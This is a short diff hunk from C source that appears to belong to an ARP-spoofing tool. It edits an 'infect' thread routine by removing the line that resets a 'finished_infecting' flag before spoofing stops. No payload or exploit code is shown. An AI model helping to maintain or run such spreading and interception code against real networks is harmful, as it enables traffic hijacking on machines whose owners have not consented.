@@ -322,7 +322,6 @@ DWORD WINAPI infect(LPVOID lparam)
 		/* redirect worked */
 		if (finished_infecting)
 		{
-			finished_infecting = 0;
 			stop_arp_spoofing();
 			CloseHandle(hThread);
 			break;
